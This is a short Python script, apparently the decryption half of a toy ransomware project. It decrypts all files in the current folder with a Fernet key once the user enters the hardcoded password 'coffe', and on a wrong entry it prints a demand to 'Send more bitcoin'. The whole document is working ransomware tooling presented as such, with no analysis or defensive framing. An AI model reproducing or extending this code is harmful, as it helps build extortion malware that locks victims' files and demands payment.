import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)
    
print(files)

with open("thekey.key", "rb") as key:
    secretkey = key.read()

user_key = "coffe"
user_input = input("Enter the key : ")

if (user_input == user_key):
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
        print("Congrats!, you're file are decrypted, Enjoy your coffe.")
else:
    print("Sorry, wrorg key, Send more bitcoin !!!")